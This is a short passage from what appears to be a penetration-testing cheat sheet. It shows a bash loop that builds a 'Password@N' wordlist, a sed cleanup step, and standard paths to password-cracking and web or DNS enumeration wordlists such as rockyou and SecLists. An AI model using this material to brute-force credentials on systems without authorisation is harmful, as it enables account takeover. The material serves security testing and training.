# Add number suffixes
for i in {1..100}; do printf "Password@%d\n" $i >> wordlist.txt; done

# Mutate — remove number-only lines
sed -i '/^[0-9]*$/d' wordlist.txt
```

### Key Wordlist Paths

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/hashcat/rules/best64.rule
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```
